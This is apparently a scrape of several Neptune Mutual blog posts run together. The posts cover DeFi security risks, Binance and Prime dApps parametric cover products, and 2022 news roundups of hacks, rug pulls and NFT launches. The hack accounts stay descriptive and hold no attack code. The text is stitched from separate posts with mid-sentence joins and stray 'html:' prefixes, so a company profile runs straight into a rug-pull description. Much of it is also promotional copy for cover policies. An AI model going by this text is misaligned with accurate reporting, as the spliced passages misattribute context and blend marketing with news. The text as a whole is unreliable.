        html: "<p>Decentralized finance—often called DeFi—refers to the shift from traditional, centralized financial systems to peer-to-peer finance enabled by decentralized technologies built on the Ethereum blockchain. From lending and borrowing platforms to stablecoins and tokenized BTC, the DeFi ecosystem has launched an expansive network of integrated protocols and financial instruments. Now with over $24 billion worth of value locked in Ethereum smart contracts, decentralized finance has emerged as the most active sector in the blockchain space, with a wide range of use cases for individuals, developers, and institutions.<br></p><p>Unfortunately, despite its growth in popularity, DeFi isn't perfect. In fact, many people have come to realize a flaw with DeFi: its security. Of course, many of these security issues are normal risks that are faced with blockchain security. However, knowing them is still important to help users know what they face when utilizing DeFi to make the most out of it.<br></p><p>That being said, let's talk about the various security risks of DeFi:<br></p><h3 id=\"1-smart-contract-vulnerabilities\">1. Smart Contract Vulnerabilities</h3><p>Smart contracts are immutable programmatic agreements that are enforced automatically when certain conditions are met. Because smart contracts are immutable, once they are deployed to the Ethereum blockchain, they cannot be changed or removed. This poses a significant security risk, as any vulnerabilities or errors in the contract code can lead to loss of funds.<br></p><h3 id=\"2-flash-loan-attacks\">2. Flash Loan Attacks</h3><p>Flash loans are short-term loans that are repaid in the same transaction. Because the loan is repaid in the same transaction that it is taken out, there is no need for a traditional credit check or for the loan to be processed through a centralized exchange. This makes flash loans very attractive to malicious actors, who can use them to exploit vulnerabilities in smart contracts or to engage in other forms of fraud.<br></p><h3 id=\"3-phishing-attacks\">3. Phishing Attacks</h3><p>Phishing attacks are a type of fraud in which attackers send emails or messages that appear to be from a legitimate source in an attempt to trick victims into sharing sensitive information or sending funds. With the growth of the DeFi ecosystem, phishing attacks targeting users of decentralized exchanges and other protocols have become more common.<br></p><h3 id=\"4-sybil-attacks\">4. Sybil Attacks</h3><p>A Sybil attack is a type of attack in which an attacker creates multiple false identities in order to gain a disproportionate amount of influence over a network. In the context of decentralized finance, a Sybil attacker could create multiple fake accounts on a lending platform in order to manipulate interest rates.<br></p><h3 id=\"5-front-running\">5. Front-Running</h3><p>Front-running is a type of market manipulation in which traders place orders ahead of others in order to benefit from the expected price movement. In the context of decentralized finance, front-running can occur when a user attempts to execute a trade on a decentralized exchange (DEX) before other users have a chance to do so. This can result in the user getting a better price for their trade, as they are able to take advantage of the price movement that is anticipated to occur when the other users' orders are executed.<br></p><h2 id=\"conclusion\">Conclusion</h2><p>Due to the complexity of DeFi, many of these security risks may stay as risks forever.  And, with more applications emerging from DeFi ecosystems, new opportunities are constantly emerging for attackers to exploit vulnerabilities. As such, if you are planning to use DeFi, it is vital to implement as many security strategies as possible to minimize your exposure to risk and limit any consequence should an attack be successful.<br></p><p>Neptune Mutual is a DeFi cover protocol marketplace where you can find cover policies that protect Ethereum projects and users from a variety of security threats.

Binance Exchange is the first CeFi exchange for which parametric cover will become available in the Neptune Mutual marketplace.</p><p>Our CEO, Binod Nirvan, said,</p><blockquote><em>We are glad to announce that the Binance exchange custody cover has been added to our platform. Binance, the biggest cryptocurrency exchange in the world, was selected as the first dedicated cover product in order to provide the Binance community an access to parametric cover policies. Neptune Mutual is the first decentralized cover protocol to offer a parametric cover policy for the Binance exchange.</em><br><br><em>In contrast to diversified covers, the Binance pool will be a dedicated cover. The Binance dedicated pool will offer guaranteed payouts, which will enhance the user experience. In addition to guaranteed payouts, the Binance community will also enjoy quick claims processing, eliminating the need to wait, submit a claim, and prove losses individually.</em></blockquote><p>A message sent by CZ, CEO of Binance, that was shared on Twitter earlier in the month, commented on the need for Binance to lead the industry by example in terms of transparency, proof-of-reserves, and insurance funds.  Binance Exchange created its own user insurance protection fund (Secure Asset Fund for Users or SAFU) back in 2018, and it was <a href="https://cointelegraph.com/news/binance-user-protection-insurance-fund-reaches-1b-valuation">reported</a> earlier this year to have exceeded $1B in valuation.</p><p>The Binance Exchange cover that can be found in our marketplace is completely independent from Binance.  It is a complementary solution to the  SAFU fund and it is a solution with a very different approach, not least of which is that user payouts are not determined by Binance in relation to individual loss (or other criteria they may use), but rather by the marketplace incident resolution process based on an evaluation of whether the policy parameters have been triggered or not.</p><p>We expect more cover products to launch soon.</p><h2 id="accessing-binance-cover">Accessing Binance Cover</h2><p>Clicking on the Binance card will lead you to more detailed information about the project and its corresponding cover policy.<br></p><p>You can purchase a policy after having carefully reviewed the parameters and terms of the cover policy. If an incident occurs, and is validated by the incident resolution process, then all cover policy holders are eligible to receive a payout. No individual loss claims need to be assessed, making the process scalable, fast and reliable.<br></p><p>You can also provide liquidity to the dedicated cover pool. Currently, LPs generate yield resulting from the fees paid by cover policy holders. In addition, dedicated cover pools lend a small percentage of liquidity to low risk lending protocols, such as Aave and Compound, in order to improve the returns to LPs.<br><br>We have designed into the protocol a number of other means by which LPs can generate returns, including Proof of Deposit (POD) staking, and as well as other staking mechanisms; these are not currently available but we expect cover creators to launch these over the coming weeks and months. To help you understand the risks and returns of becoming an LP, and understand the difference between parametric and discretionary cover, we have written a comprehensive article on “<a href="https://blog.neptunemutual.com/understanding-underwriting-capital-not-all-pools-are-alike-know-a-pool-before-you-jump-in/">Understanding Underwriting Capital</a>”.<br></p><p>We recognise that sourcing liquidity for cover protocols is one of the biggest constraints to widespread adoption of cover in the blockchain industry, and so we have paid particular attention to LP needs in terms of transparency of risks and returns of the stablecoin pools and also exit strategies for LPs.</p><h2 id="navigating-the-parametric-cover-marketplace">Navigating the Parametric Cover Marketplace</h2><p>For those of you who have interacted with either of our testnet applications over the last couple of months, the process of navigating through the marketplace is the same. <br></p><p>We have published a number of <a href="https://www.youtube.com/c/NeptuneMutual/videos">in-depth explainer videos</a> in its YouTube channel, and you can also visit the <a href="https://blog.neptunemutual.com/">resource section</a> for informative articles, updates, cover creator profiles, hack analyses, and more.<br></p><p>Moderators are available to answer questions and share information in our <a href="https://discord.com/invite/2qMGTtJtnW">Discord</a> and <a href="https://twitter.com/neptunemutual">Twitter</a> communities.</p><h2 id="check-out-our-marketplace">Check Out Our Marketplace</h2><p>Visit <a href="https://app.neptunemutual.com/">app.neptunemutual.com </a>to access the marketplace and engage with the various stakeholders.</p><h2 id="about-binance">About Binance</h2><p>Founded in 2017, Binance is the largest centralized crypto exchange ranked by daily volume traded.

Unethical incidents like these are where the project team, and their associated members, flee with their investors money, including the funds from their community as a whole. Rug pulls are typically executed by scammers who create a buzz around their tokens and then abandon the project, taking off with the money. The simplest approach to avoid being “rugged” is to do your own diligence, check the transparency and experience of the team, and understand the utility of the token. If a project looks too good to be true, it probably isn't.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks</h2><p>Sheep Farm, an investment blockchain game on the BNB chain, was attacked by a hacker causing a loss of approximately 262 $BNB tokens worth $72,000. The vulnerability existed in the register function of the SheepFarm contract, which could be invoked multiple times. The attacker called the upgradeVillage function to accumulate yield while consuming gems properties, and then finally called the sellVillage method to convert yield to money before withdrawing them. We have outlined the detailed analysis of the exploit <a href=\"https://blog.neptunemutual.com/decoding-sheep-farm-smart-contract-hack/\">here</a>.<br></p><p>The Ranger project on BSC Chain was identified as a rugpull. The contract deployer transferred the tokens to an externally owned address, which then sold for a profit of approximately $77,000. The value of Ranger tokens fell down by approximately 95% after this incident. <br></p><p>After being suspected of a rugpull, the price of the $FLARE token on the BSC Chain plunged by more than 95%. The amount of loss was approximately $18.5 million, of which 4000 $BNB tokens were funnelled to Tornado Cash. The exploited transactions showed that about 4 billion $FLARE tokens were distributed to the token deployers and other connected addresses throughout this procedure.<br></p><p>DeFiAI, a decentralised, multi-strategy, high yield aggregator built on AI trading, announced that their contract has been breached, leading to significant losses. The team mentioned that they would reopen the contract to ensure the security of the money once the loophole had been closed. The project was yet another case of a rugpull, and the contract deployer is thought to have earned a profit of $4 million from it. The stolen funds have been transferred to Fixedfloat and MEXC.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs</h2><p>Nike has launched Swoosh, a new Web3 platform that will offer Polygon-based NFT products. The Swoosh platform is billed as the hub of Nike's digital efforts centered on Web3. It is intended to highlight the brand's NFTs and virtual apparel initiatives, as well as future opportunities for customers to become co-creators and share digital product royalties. Nike will use the platform as a hub to launch virtual apparel for avatars such as t-shirts and sneakers that can be used in Web3 games. It will also use Web3 technology to enable users to gain access to real-world benefits such as exclusive physical apparel and chats with pro athletes.</p><p>Adidas Originals has released its latest NFT offering in the form of virtual wearables. The new product dubbed Virtual Gear is an interoperable NFT fashion experience. The launch represents a significant step forward for the three-striped brand as it expands its web3 community and metaverse strategy. The limited edition 16-piece NFT collection defines the brand's creative and cultural talent shaping its future. The collection connects real-world and metaverse identities, as well as Adidas' communities, creators, and web3 culture in general. The collection is available to owners of the Adidas Originals Capsule NFT Collection, which was released in May, as well as anon-holders.</p><p>Johnnie Walker, a popular Scotch whisky brand, will soon launch redeemable NFTs on BlockBar to mark an important cultural development for the arts. Participants will be able to interact and discover other cultures during the event, which will take place on December 1 in Miami. The NFTs, which are based on the Johnnie Walker Blue Label, will go on sale on November 22. Johnnie Walker acknowledged in a press release that it has worked with music and arts collaborative 88rising as well as streetwear designer VandyThePink. Owners of the NFTs will be able to vote on the artwork of the bottles and will also receive a signed, serial-numbered piece of commemorative art while enjoying an elevated Johnnie Walker Blue Label tasting experience.</p><p>Red Bull Racing has also shown its support and enthusiasm towards web3 based projects. A blue-chip NFT will be on a Formula One race car for the first time. Oracle Red Bull Racing has partnered up with Bybit and Chiru Labs to create a new NFT collection based on Azuki #8494. It's the first time a blue-chip NFT has taken part in an F1 race before the World Champions of 2022. To commemorate the team’s record-breaking season, fans will also have the chance to own a Lei the Lightning Azuki NFT. The new NFT collection will be minted on the Tezos blockchain, and will champion the anime character Lei the Lightning Azuki.</p><p>Binance has unveiled a new global marketing initiative with Portuguese football star Cristiano Ronaldo in honor of his inaugural NFT launch. The NFT collection dubbed the CR7 NFT Collection, is the first in a series of drops heralding Ronaldo's legacy. The NFTs, which went live on Friday exclusively on Binance's NFT marketplace, featured seven animated statues depicting iconic moments from his career, organized into four rarity levels of Super Super Rare (SSR), Super Rare (SR), Rare (R), and Normal (N). The NFT tiers come with exclusive perks such as personal message from Ronaldo, autographed merchandise, guaranteed access for future drops and complimentary mystery boxes for new sign-ups.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>Neptune Mutual launched Black Friday offer via a <a href=\"https://twitter.com/neptunemutual/status/1593663693199245312\">Twitter thread announcement</a>.

This is when you supply liquidity to cover pools that provide <a href="https://blog.neptunemutual.com/understanding-underwriting-capital-not-all-pools-are-alike-know-a-pool-before-you-jump-in/">underwriting capital</a> for cover products on Neptune Mutual.</p><p>The very first cover pool on the Neptune Mutual is the Prime dApps Diversified Cover Pool.</p><h2 id="prime-dapps-overview">Prime dApps Overview</h2><p>Prime dApps is a collection of parametric cover products for seven top-rated DeFi projects – AAVE, MakerDAO, Uniswap, Curve Finance, Balancer Labs, Gnosis Safe, and Synthetix. These projects are relatively mature, with large TVLs (Total Value Locked) and they have relatively high levels of security.</p><p>Users of these dApps can purchase cover policies to provide cover for their digital assets with  fast and reliable payouts to all policyholders should an incident arise and be validated by our incident resolution process.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.neptunemutual.com/content/images/2022/11/neptune-mutual-prime-dapps.jpeg" class="kg-image" alt loading="lazy" width="1600" height="1334" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/11/neptune-mutual-prime-dapps.jpeg 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/neptune-mutual-prime-dapps.jpeg 1000w, https://blog.neptunemutual.com/content/images/2022/11/neptune-mutual-prime-dapps.jpeg 1600w" sizes="(min-width: 720px) 720px"><figcaption>Prime dApps DeFi cover products on Neptune Mutual</figcaption></figure><p>Parametric cover makes sense for blockchain projects because it empowers the community of those projects to mitigate security risk.  It also demonstrates to communities a mature and responsible attitude of the project developer in relation to a commitment towards high level security and a process to manage loss if an incident arises. <br><br>Parametric cover is different from the cover found on many other cover protocols in that it does not require individual claims processing.</p><p>You can learn more about <a href="https://blog.neptunemutual.com/how-are-discretionary-and-parametric-covers-different/">how parametric cover compares to discretionary cover</a> and what benefits they provide in the blockchain space.</p><h2 id="backed-by-a-diversified-cover-pool">Backed by a Diversified Cover Pool</h2><p>One of the main standout features of the Prime dApps basket is that cover products are underwritten with capital from a single diversified cover pool. This means that the underwriting capital for all seven DeFi projects listed under Prime dApps is sourced from a single cover pool.</p><p>Capital is provided to cover pools in stablecoin (USDC). This helps ensure that the underwriting capital does not fluctuate in value as a result of cryptocurrency / digital token price volatility.</p><p>It’s important to note that cover policies can only be purchased directly with the individual projects (as identified by their corresponding cards) within the portfolio of a diversified cover pool.   In contrast, liquidity can be provided by users to the diversified  cover pool and this liquidity is allocated across all of the different cover products.</p><p>Diversified cover pools help enhance underwriting capital provision for projects that may not be large enough, or popular enough to warrant a dedicated cover pool, or for low risk projects where policy premiums might be insufficient to attract liquidity providers.</p><p>Learn more about <a href="https://blog.neptunemutual.com/diversified-cover-pools-increase-the-options-available-to-liquidity-providers-and-cover-purchasers-alike-is-this-the-route-to-scaling-adoption-of-digital-asset-cover-protection/">diversified cover pools and how they help make cover products more accessible on Neptune Mutual</a>.</p><h3 id="who-creates-diversified-cover-pools">Who Creates Diversified Cover Pools?</h3><p>All cover pools in the marketplace are set up by cover creators.  For diversified cover pools there are a range of specialist actors in the DeFi space that we are in touch with in relation to creating diversified pools.</p><p>In the case of dedicated cover pools it is likely that the cover creator will often be the project developer.</p><h2 id="accessing-prime-dapps-cover-products-on-neptune-mutual">Accessing Prime dApps Cover Products on Neptune Mutual</h2><p>Visit the Neptune Mutual marketplace at <a href="https://app.neptunemutual.com/">app.neptunemutual.com</a>. Project cards are displayed under Cover Products. Here you’ll find the cards for all seven cover products under Prime dApps.</p><p>Click on any of the cards to reveal all the information about that specific project and the corresponding cover policy. For instance, the Balancer V2 cover product provides cover that mitigates the loss of assets resulting from a smart contract hack or code exploit for the Balancer project.</p><p>As a cover purchaser, you need to carefully review all the cover parameters to ensure that the policy matches your needs and expectations. For example, one of the parameters in the AAVE Ethereum Market V2 cover policy defines a minimum loss of 5M USD. All parameters are clearly outlined in the Purchase Policy page that can be accessed by clicking on each project card. It’s also very important for users to read the full terms and conditions of the marketplace.</p><h2 id="defi-hacks-and-exploits-continue-to-rise">DeFi Hacks and Exploits Continue to Rise</h2><p>2022 has been quite a productive year for hackers and cybercriminals.

We’ve even launched an <a href="https://blog.neptunemutual.com/tag/exploit-analysis/">Exploit Analysis</a> section that decodes the latest hacks and exploits in the blockchain space. Regular security measures do not guarantee 100% security of your digital assets.</p><p>Mitigate your risk exposure today by taking out a cover policy. With the Prime dApps portfolio, users can now access parametric cover protection for seven different popular DeFi projects and of course users can also contribute liquidity to the diversified cover pool and benefit from a share of the policy revenues.</p><p>Cover products with dedicated cover pools for CeFi and Web 3 projects are also scheduled to launch on the Neptune Mutual marketplace in the coming weeks.

Almost daily, we learn of hacks and exploits that have the potential to cause a project team or its community significant loss of assets. To safeguard your digital investments, consider mitigating security risk by purchasing cover protection from an online cover protocol, such as the <a href=\"https://app.neptunemutual.com/\">Neptune Mutual marketplace</a>.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks</h2><p>DFX Finance, an Ethereum-based decentralized exchange protocol was hacked for approximately 3000 ETH, roughly equivalent to $4 million due to the lack of proper reentrancy protection. The issue was prevalent in DFXFinance’s DEX pool named Curve, after which their pools LPs were locked until further investigation of the issue. The stolen tokens include $USDC, $EUROC, $GYEN, $XIDR, $XSGD, and $ZNDS and the attacker then swapped them to ETH. The perpetrator then laundered them by depositing into Tornado Cash.</p><p>An attack on the brahTOPG project on the ETH chain resulted in a profit of around $89,879 for the attacker. The attack was carried out as a result of the Zapper contract's strict verification of the user-provided data, which created a problem enabling arbitrary external calls. The attacker used this arbitrary external call problem to steal the tokens of users who were still authorized to use the contract. The attacker initially checked the victim user's balance before using one of the Zapper contract's functions to transfer the token to the contract. The attacker took advantage of the function's ability to accept externally modifiable arguments to produce a fake token, send it to the contract, and then steal 89,343 $USDC from three victim accounts. We have also shared a detailed analysis of the exploit <a href=\"https://blog.neptunemutual.com/decoding-brahtopg-smart-contract-vulnerability/\">here</a>.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs</h2><p>More well-known businesses are looking into the idea of the Metaverse and how it could be applied to customer engagement. The list was most recently expanded by Forbes as they prepared for their event to be held in partnership with The Sandbox metaverse. A wearable NFT that acted as their entry ticket was provided to attendees of the event. Once inside, visitors were able to partake in a variety of adventures related to the Forbes Metaverse, such as discovering hidden objects like the Forbes Highlander Yacht. The event also had an NFT gallery, and virtual billionaires who were well-developed Metaverse personalities with their own virtual wealth.</p><p>In collaboration with FIFA, Altered State Machine is launching a unique metaverse game in the hopes of creating exciting new online football experiences. This innovative new smart football game will introduce intelligent AI characters to a broader gaming audience. The game begins with a prediction game that will be available during the FIFA World Cup 2022. Players will be able to participate in this entertaining football-themed metaverse game starting November 20. The game will allow players to create teams and compete against others in an AI football game.</p><p>After a successful inaugural iteration, Decentraland is back with their Metaverse Music Festival. The world's largest virtual celebration of music, the virtual music festival is living up to expectations. The metaverse is stepping it up a notch in its second iteration with an exotic cyberpunk theme. The four-day celebration of everything from music and innovation to culture and creativity will culminate on November 13, in which visitors will be able to take in a musical experience unlike any other. This year's impressive list of performers includes Gramatik, Arapu, Ozy Ozbourne, and Dillon Francis, and the activities will take place on fifteen stages throughout the virtual world.</p><p>Adidas has released a teaser video for their second Metaverse phase, dubbed Unbox the Impossible. The video showed an Adidas sweatshirt morphing into various shapes, including a rocket. The accompanying text read, Welcome to adidas Into the Metaverse Phase 2. Unbox the impossible. 16.11.2022, confirming the unboxing date of these NFTs. A link on Adidas' social media leads to a countdown clock that includes 3D images of some of these NFTs.</p><p>NFTs are still gaining traction in the business world and are being adopted by some of the most well-known brands in the world. Rolex is yet another recent addition to the list as the brand has submitted trademark applications for NFT related products. The premium watch manufacturer is reportedly considering launching not only NFTs itself but also software to simplify the auctioning of digital assets, including watches. The company is also considering developing a marketplace where buyers and sellers may exchange comparable goods.</p><p>Line, the Japanese messaging platform, has announced the launch of its brand-new NFT marketplace. This was created by LineNext, their NFT division, and is hosted on the DOSI NFT platform. Anyone can create an account by connecting their Google, Line, or Facebook account with a MetaMask wallet on the marketplace, which is exclusively a C2C environment. Although other payment methods will soon be available, users can currently only pay for NFTs using credit cards, Ethereum, and Naver Pay. The administrative team has reported that further projects are in the pipeline, all of which are intended to acquaint users with NFTs.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>Neptune Mutual has launched their cover marketplace on the Ethereum network, beginning with a diversified cover pool called “Prime dApps” that comprises some of the most well-known decentralized Applications in the DeFi industry, including Aave, Maker DAO, and Uniswap, among others.</p><p>Nexus Mutual communicated that members who held FTX Custody Cover would be able to file individual loss claims if FTX withdrawals were still halted on the 6th February 2023.  Nexus Mutual’s FTX Custody Cover liabilities were reported as a total 1611 ETH and 6,853,539 DAI, which at the time of writing was valued at ~$8.79m USD representing 4.33% of the capital pool holdings.</p><p>InsurAce communicated via Twitter that their exposure to FTX (Custodian Cover) was approximately $40k USD.</p><p>Ease DeFi has added bonuses to the Uninsurance ecosystem, hence raising the APR for $Ease stakeholders leasing their $gvEase.</p><p>Credora modified its scoring methodology to discount borrower FTX assets by an off-set of 50%. This modification was applied across multiple factors in the Credora Credit Evaluation, affecting Leverage, Equity, and Current Ratio scores.</p><hr><h2 id=\"about-us\">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

pool</figcaption></figure><p><br>Clicking on any of the cards will lead to more detailed information about each respective project and the corresponding cover policy.  Aave Ethereum Market V2, for example, provides a cover policy that mitigates the loss of assets as a result of a vulnerability in smart contracts on the ethereum blockchain for Aave Ethereum market V2.  One of the parameters in the policy defines a minimum loss of 5M USD, meaning that the loss to the protocol resulting from a smart contract hack needs to be at this amount to trigger this parameter.  Obviously, all the cover parameters need to be reviewed carefully by cover purchasers to ensure that the policy matches their needs and expectations.  In addition all users should read the full terms and conditions of the marketplace.<br></p><p>Cover products that have liquidity supplied by a Diversified Cover Pool are labeled with a D, followed by a number that indicates the maximum multiplier factor of the cover pool, e.g. D6 means 6x leverage at max in total for the cover pool, though in reality subject to tech team assessment, most of the individual protocols will be subject to a % limit for its constituent weight, hence the effective max multiplier (leverage) shall be smaller than the indicated number.  The max percentage of liquidity allocated to a specific product is indicated by the next number, So for the AAVE card it is labeled D6X90, meaning AAVE is allowed to consume a max of 90% liquidity had there been no multiplier. <br><br>So, as an example, for the Prime dApps diversified pool with 7 cover products and 6x max leverage, a liquidity of 1M would give a Total Capacity of 6M.  Selecting one cover product out of the seven, the maximum capital available for this product is 1/7 of 6M = 860k.</p><p>Applying the “weight” of 90% (D6x90) to the maximum capital available to this product would be 90% of 860K = 774K.<br></p><p>The cover fee amount (paid by cover policy purchasers when buying a cover policy) is calculated dynamically and will change depending on how much of the capital allocated to the particular cover product has been utilized i.e. how much of the underwriting liquidity has been committed through the sale of cover policies.  As utilization of liquidity in the pool rises as a result of cover policy sales, so the cover fee of each subsequent cover policy increases.  The cover card shows the spread between the lowest price, or floor price, of the cover policy, and the maximum price, or ceiling price, of the cover policy.<br></p><p>Users should be wary of comparing the pricing of parametric cover and discretionary cover from other protocols as the cover is very different in nature.  In the case of parametric cover, if an incident is validated, ALL cover policy holders can claim a payout, without making an individual loss claim, irrespective of whether the user has suffered a loss.  The parametric approach to cover protection whereby incidents are assessed, and not individual loss, is what makes parametric policy payouts both fast and reliable.<br></p><p>In addition to purchasing parametric cover policies, you can also supply liquidity to the Prime dApps liquidity pool. This stablecoin-backed cover pool provides the underwriting capital that enables the pool to fund the cover policies of the portfolio of cover products. In return, liquidity providers generate a yield on the liquidity provided directly from the cover policy purchaser fees. <br></p><p>Other apps in the DeFi, CeFi and metaverse spaces are expected to debut on the Neptune Mutual marketplace in the coming weeks.</p><h2 id="check-out-the-neptune-mutual-marketplace">Check Out the Neptune Mutual Marketplace</h2><p>Visit <a href="https://app.neptunemutual.com/">app.neptunemutual.com</a> to access the Neptune Mutual Marketplace and engage with the various stakeholder roles.

        html: "<h2 id=\"tldr\">TL;DR <br></h2><ul><li>Multiple DeFi hacks resulted in over $32.5 million in stolen assets.</li><li>GameStop has confirmed the launch of its NFT marketplace on ImmutableX.</li><li>Visa has collaborated with Crypto.com to auction off World Cup-themed NFTs.</li><li>Meta announced a toolkit for Instagram users to mint NFTs on the Polygon blockchain.</li><li>Kraken has launched the beta version of its NFT marketplace.<br></li></ul><p>So far this year, October has seen the most losses due to blockchain hacks, smart contract vulnerabilities, scams, and other exploits. The total amount of hacked funds increased by more than 430% compared to September, resulting in more than $718 million stolen from DeFi protocols across 11 major hacks.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks</h2><p>Skyward Finance, an on-chain asset issuance IDO platform on the NEAR protocol, suffered a vulnerability exploit and lost over 1.08 million $NEAR tokens with a value of approximately $3.2 million. The vulnerability existed because the contract's redeem skyward function, which is used to redeem the treasury from the protocol, lacked a check and parameter validation. This function did not check whether the passed-in token account id values are duplicates. The hacker utilized this opportunity to withdraw multiple wrap.near tokens in a single transaction. The attacker submitted multiple token account ids and utilized the loop values to deposit the rewards multiple times to drain their treasury. We have decoded the analysis of this exploit in our <a href=\"https://blog.neptunemutual.com/decoding-skyward-finance-smart-contract-vulnerability/\" rel=\"follow\">blog post</a>. <br></p><p>Rubic, the multi-chain exchange protocol, was exploited due to malware that stole the private key following the disclosure of an administrator's wallet address, which controls the RBC/BRBC cross-chain bridge and staking rewards. The attacker sold approximately $ 303,758 worth of RBC/BRBC on Uniswap and PancakeSwap. The team said that the user's staking funds were secure and none of their smart contracts had been compromised.<br></p><p>Deribit, the cryptocurrency derivatives exchange, suffered a loss of approximately $28 million due to an exploit involving a compromised hot wallet. The breach was isolated and quarantined to their BTC, ETH, and USDC hot wallets, resulting in the loss of 6,967.65 ETH, 691 BTC, and approximately 3.41 million USDC, with the hacker exchanging USDC for 2,143.95 ETH. After the event, they began conducting security checks, halting withdrawals from Copper Clearloop and Cobo, among other third-party custodians. The team reported that no client assets, fireblocks, or cold storage addresses were compromised. The customer's funds will remain secure, and losses will be covered by the company's reserves.<br></p><p>Solend, a Solana-based lending protocol, was exploited due to price manipulation against USDH affecting Stable, Coin98, and Kamino's isolated pools, resulting in $1.26 million in bad debt. The team asserted that all other pools, including their Main pool, are secure and that the affected pools have been disabled. The attacker manipulated the USDH price on a switchboard v1 feed to be greater than $8, and then borrowed a large amount of other tokens based on the inflated collateral size.<br></p><p>Loopring, the Ethereum Layer2 zkRollup protocol, was a target of a coordinated large-scale DDoS attack. This caused the operation of the protocol's services to be down for 11 hours, while the funds were completely safe. The team attempted to mitigate the issue by first shielding and limiting requests to reduce unnecessary traffic but was unable to resolve the problem. They later contacted AWS security engineers for additional support, after which the backend, and wallet services were restored.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs</h2><p>Meta has continued its unrelenting advance into the frontier world of the blockchain. This time around they announced an end-to-end toolkit allowing Instagram users to mint NFTs on the Polygon blockchain and sell them on social media. The statement stated that certain U.S.-based creators will be given the opportunity to produce digital artifacts that would be available for purchase both within and outside of Instagram. The platform continued by saying that its users may now also present video NFTs, and that OpenSea would give the metadata of select collections, including the descriptions and titles of the items in those collections.</p><p>The government of Hong Kong launched a NFT-backed initiative to promote fintech during their Hong Kong Fintech Week 2022. Along with launching a green bond and its e-HKD, the Hong Kong government also launched an NFT, which served as evidence of attendance at the fintech week. These NFTs will serve dual purposes as both souvenirs and evidence of attendance at the event. The proceeds from the sale of NFTs will be used to promote the 2023 Hong Kong Fintech Week by providing early notification and discounts for attendees.</p><p>ImmutableX has announced the official launch of the GameStop NFT Marketplace, which provides GameStop players and GameStop Powerup Pro loyalty customers across the United States access to web3 games and NFT gaming assets. This integration enables some of the world's most popular web3 games, such as Gods Unchained, Guild of Guardians, and Illuvium, to be built on ImmutableX. In addition, it enables 100% gas-free and carbon-neutral minting and trading on the GameStop NFT Marketplace. Visitors to the marketplace will be able to access low-cost in-game assets to buy and sell.</p><p>Visa has partnered with Crypto.com to bring NFTs to the World Cup with their Masters of Movement campaign, a fan experience that includes a world cup themed NFT auction for charity. Visa will mint and auction off five NFTs inspired by some of the most memorable goals in both Men’s and Women’s World Cup history, scored by legendary players including Michael Owen, Tim Cahill, Jared Borgetti, Carli Lloyd, and Maxi Rodriguez. The auction, which is taking place on Crypto.com, allows fans to bid on the NFTs with all proceeds benefiting Street Child United, a UK charity that aims to protect and support children living on the street. The fans who placed the highest bids will receive not only their new NFT in their Crypto.com wallets, but also printable art files and signed memorabilia from each of the players whose goals are featured in the NFTs.</p><p>Kraken, the cryptocurrency exchange, has launched the beta version of its long awaited NFT marketplace, creating an intuitive and gasless destination for making all of those essential NFT purchases, available for users who claimed a whitelist back in May. The company has stated that the new platform will be available to the general public soon. Collectors will find a 70-strong curated offering of top selling tokens among its vast array of NFTs from a number of leading blockchains, as well as purchases in over 200 cryptocurrencies and 8 different forms of fiat payment. They've also included a slew of useful buying tools in the package, such as a rarity detector, multi-chain compatibility, and industry-leading security.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>Neptune Mutual attended Hong Kong Fintech week and were both present at the event as well as having an online presence with a virtual booth.

Whilst we have seen a downturn in market conditions, hacks of digital losses have been on the rise, and we firmly believe that a scalable solution to this problem is urgently needed in the blockchain industry.</p><h2 id="the-story-so-far">The Story So Far</h2><p>We have been working hard since the incorporation of our company in September last year:  building the team, raising funds, building the product, testing UX and of course testing security.</p><p>From the outset we have been driven by four <a href="https://blog.neptunemutual.com/be-aware-of-the-bear-crypto-crash-heightens-awareness-of-risks-hacks-but-is-this-enough-to-drive-mainstream-adoption-of-digital-asset-protection/">design principles</a> : security, minimizing risk, scalability, and user experience.</p><p>In March 2022, the protocol launched on the Polygon Mumbai testnet with over 25k Neptunite community members participating in gamified contests that saw them become cover purchasers, liquidity providers, and incident reporters.</p><h2 id="security-security-security">Security, security, security</h2><p>Security expertise is a core strength of Neptune Mutual and we are fully committed to being open and transparent about security, most particularly our own;  we aim to lead by example and we are one of the few cover protocols with a codebase that is fully open to the public on Github.</p><p>We have invested heavily in security and code audits, and we shall continue to do so on an ongoing basis.  The protocol underwent its first <a href="https://blog.neptunemutual.com/first-audit-report/">code audit</a>, which was conducted by leading security audit firm, BlockSec.</p><p>We commissioned Open Zeppelin to conduct a 2nd audit of our codebase and we have been working closely with them since the month of August to review and refactor the codebase to take into account their recommendations.  Security is our first priority at Neptune Mutual and the team has invested a lot of time and energy over the last few months in checking the extensive codebase of our marketplace.   The Open Zeppelin <a href="https://blog.openzeppelin.com/neptune-mutual-audit/">audit report</a> is now publicly available on their website and we will also be updating our website with links to this report and also the audit report published by Blocksec.</p><p>Likewise, we perform rigorous assessments to gate-keep what projects are allowed to create cover products in the Neptune Mutual marketplace.   Our security assessments are based on a wide range of factors such as the project’s overall IT security health, whether its open sourced, audit records, the project’s track record of incidents, the experience and transparency of the team etc.  We provide guidance to diversified cover pool creators in relation to the risk of their portfolio of cover products and then review the cover creator decision relating to capital efficiency of their diversified pool.  The intent, as always, is to safeguard our ecosystem, and, as far as possible, find the right balance of risk/return for both LPs and cover policyholders.</p><h2 id="the-neptune-mutual-ecosystem">The Neptune Mutual Ecosystem</h2><p>We are growing what we believe to be a robust <a href="https://blog.neptunemutual.com/the-neptune-mutual-ecosystem/">Neptune Mutual ecosystem</a> made up of key stakeholders, marketplace actors, strategic partners, lending protocols, and of course, the Neptunites community.</p><p>Neptune Mutual Association is a not-for-profit entity whose primary purpose is to moderate the marketplace and oversee the correct operation of the event reporting and incident resolution process.</p><p>There are four primary stakeholder roles in the Neptune Mutual marketplace:</p><ul><li><strong>Cover Creators</strong> – These are 